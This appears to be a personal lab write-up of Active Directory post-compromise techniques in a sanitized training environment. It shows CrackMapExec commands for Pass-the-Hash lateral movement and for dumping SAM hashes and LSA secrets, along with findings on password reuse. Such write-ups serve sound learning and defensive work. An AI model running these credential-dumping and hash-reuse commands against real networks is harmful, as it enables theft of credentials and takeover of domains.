# Post-Compromise Attack – Pass-the-Hash & Credential Dumping (Active Directory Lab)

## 📌 Overview

This lab demonstrates post-compromise techniques in an Active Directory environment, focusing on lateral movement using Pass-the-Hash (PtH) and credential extraction using CrackMapExec.

The goal was to move across multiple machines, identify credential reuse, and extract valuable authentication data for further escalation.

---

## 🎯 Objective

- Validate compromised credentials across the network
- Perform lateral movement using Pass-the-Hash
- Extract local and cached credentials (SAM & LSA)
- Identify credential reuse and potential escalation paths

---

## 🛠 Tools Used

- CrackMapExec (CME)
- SMB Protocol
- Hashcat (for offline cracking)

---

## 🧪 Lab Setup

- Domain: `<DOMAIN>`
- Network Range: `<TARGET_NETWORK>`
- Machines:
  - `<HOST-1>` (Workstation)
  - `<HOST-2>` (Workstation)
  - `<DC>` (Domain Controller)

---

## 🚀 Attack Flow

### 1. Credential Validation

Initial domain user credentials were tested across the network:

```bash
crackmapexec smb <TARGET_NETWORK> -u <USERNAME> -d <DOMAIN> -p <PASSWORD>
```

✅ Successful authentication on multiple machines
🔥 Admin access identified on selected hosts (Pwn3d!)

---

### 2. Pass-the-Hash (PtH)

Used NTLM hash for authentication instead of plaintext password:

```bash
crackmapexec smb <TARGET_NETWORK> -u administrator -H <NTLM_HASH> --local-auth
```

✅ Successful lateral movement
💥 Multiple machines compromised using same local admin hash

---

### 3. SAM Hash Dumping

Extracted local account hashes:

```bash
crackmapexec smb <TARGET_IP> -u administrator -H <NTLM_HASH> --sam
```

🔍 Observed:

- Local Administrator hash reuse
- Multiple users sharing identical credentials

---

### 4. LSA Secrets Dumping

Extracted cached credentials and sensitive secrets:

```bash
crackmapexec smb <TARGET_NETWORK> -u administrator -H <NTLM_HASH> --local-auth --lsa
```

🔐 Discovered:

- Domain Cached Credentials (DCC2)
- Service account credentials
- Machine account secrets

---

### 5. Credential Analysis

Identified valuable credentials:

- Domain User → `<USER>`
- Service Account → `<SERVICE_ACCOUNT>` ⭐
- Local Administrator → reused across systems

---

### 6. Key Finding – Password Reuse

Multiple machines shared the same local administrator hash, enabling:

➡️ Seamless lateral movement
➡️ Full administrative access across systems

---

## 🔥 Key Findings

- Password reuse enabled lateral movement across multiple machines
- Local Administrator hash reused across hosts
- Cached domain credentials (DCC2) exposed
- Service account discovered as potential escalation vector
- SMB signing disabled on one host (security weakness)

---

## 🧠 Lessons Learned

- Pass-the-Hash is highly effective in poorly configured environments
- Credential dumping is critical after initial compromise
- Service accounts can provide escalation opportunities
- Cached credentials can lead to domain compromise if cracked

---

## ⚠️ Notes

- All IPs, usernames, and hashes have been sanitized
- This lab was conducted in a controlled environment for educational purposes only

---

## 📎 Author

- GitHub: https://github.com/bilalhunzla
- LinkedIn: www.linkedin.com/in/hunzla-bilal

---
